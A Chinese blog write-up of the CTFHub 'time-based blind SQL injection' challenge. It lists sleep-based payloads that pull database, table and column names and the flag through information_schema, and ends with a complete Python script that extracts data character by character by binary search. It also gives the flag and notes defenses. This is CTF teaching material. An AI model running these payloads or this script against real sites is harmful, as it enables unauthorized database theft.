---
layout: post
title: "CTFHub SQL注入 - 时间盲注"
date: 2026-10-12
categories: ctfhub
tags: [ctfhub,web,sql注入,时间盲注]
permalink: /ctfhub/sql-time-sqli.html
---

# CTFHub SQL注入 - 时间盲注
## 一、题目信息
平台：CTFHub
分类：Web - SQL注入
题目名称：时间盲注
难度：简单
Flag：`ctfhub{52d8f0ad8ca2fc124e3b1e34}`

## 二、考点
1. 时间盲注原理，依靠页面响应延时判断SQL真假
2. GET型整数注入，二分法脚本猜解数据
3. MySQL元数据库`information_schema`查询库、表、字段
4. mid、ascii函数逐字符猜解数据

## 三、题目内容
页面接收id参数查询，**无直接数据回显，也没有真假页面文本差异**。无法使用union联合查询、报错注入、布尔盲注，适合时间盲注。
后端SQL大致形式：`select * from news where id=用户输入`

## 四、解题步骤
1. **判断注入类型，验证sleep延时**
payload：`1 and if(1=1,sleep(3),0)`，页面会明显延迟3秒返回；
payload：`1 and if(1=2,sleep(3),0)`，页面立刻返回，无延迟。
证明整数型注入，可利用`if()+sleep()`构造时间盲注。

2. **获取当前数据库名**
payload：`1 and if(ascii(mid(database(),1,1))>100,sleep(3),1)`
利用`mid`截取字符、`ascii`转为数字，二分比较猜解库名。
得到数据库名：`sqli`

3. **查询该库下所有表名**
payload：`1 and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100,sleep(3),1)`
得到表：`news,flag`，目标表为flag。

4. **查询flag表中的字段名**
payload：`1 and if(ascii(mid((select column_name from information_schema.columns where table_name='flag' limit 0,1),1,1))>100,sleep(3),1)`
得到字段名称：`flag`。

5. **读取flag值**
payload模板：`1 and if(ascii(mid((select flag from sqli.flag limit 0,1),pos,1))>mid,sleep(3),1)`
pos代表字符位置，mid是二分中间值，循环猜解每一位字符。
> 注意：子查询需要加`limit 0,1`，防止返回多行数据造成字符错乱。

## 五、知识点解析
1. **时间盲注**：页面无回显、无真假文本差异，通过SQL语句执行产生的响应延时，逐字符猜取数据。
2. **mid()**：字符串截取函数，`mid(字符串,起始位置,截取长度)`，位置从1开始，与substr功能相同。
3. **ascii()**：将字符转为ASCII码，用于大小比较。
4. 二分法：缩小ASCII范围，大幅减少请求次数，提升盲注效率。
5. `limit 0,1`：限制只返回第一条记录，避免多条记录拼接导致猜解错误。
6. `if(条件,true执行,false执行)`：MySQL条件函数，条件成立则执行sleep产生延时。

## 六、总结
时间盲注适用场景：无正常数据回显，页面返回内容一致，无法布尔判断，只能依靠响应时间差异判断真假。
流程：判断注入点与延时可用性 → 爆库名 → 爆表名 → 爆字段 → 逐字符猜解flag。
防御方式：过滤sleep等延时函数，使用预编译语句，限制SQL最长执行时间。

> 踩坑点：
> 1. CTFHub沙箱为多用户共用，服务器负载波动，单次请求时间不稳定，容易出现个别字符误判；
> 2. 没有重试机制时，网络抖动会造成ASCII判断出错，flag个别字符读取错误；
> 3. sleep时间与判断阈值设置太近，真假延时区分不明显；
> 4. 子查询不加`limit 0,1`会读取多条记录，字符错误。                                                        

 
## EXP
```python
import requests
import time

url = "http://challenge-4a7b457f88ee5591.sandbox.ctfhub.com:10800"

def is_true(payload):
    hit = 0
    # 同一个payload请求3次，命中2次延时才算true，降低误判
    for _ in range(3):
        start = time.time()
        try:
            requests.get(url + "?id=" + payload, timeout=15)
        except Exception:
            pass
        cost = time.time() - start
        if cost > 2.3:
            hit += 1
        time.sleep(0.3)
    return hit >= 2

def guess_char(sql, index):
    left, right = 32, 126
    while left <= right:
        mid = (left + right) // 2
        payload = f"1 and if(ascii(mid(({sql}),{index},1))>{mid},sleep(3),1)"
        if is_true(payload):
            left = mid + 1
        else:
            right = mid - 1
    return chr(left)

def get_string(sql):
    result = ""
    for i in range(1,40):
        ch = guess_char(sql,i)
        result += ch
        print(f"当前flag：{result}")
        if ch == "}":
            break
    return result

# 查询sqli库flag表中的flag字段
flag = get_string("select flag from sqli.flag")
print("\n✅完整flag：",flag)
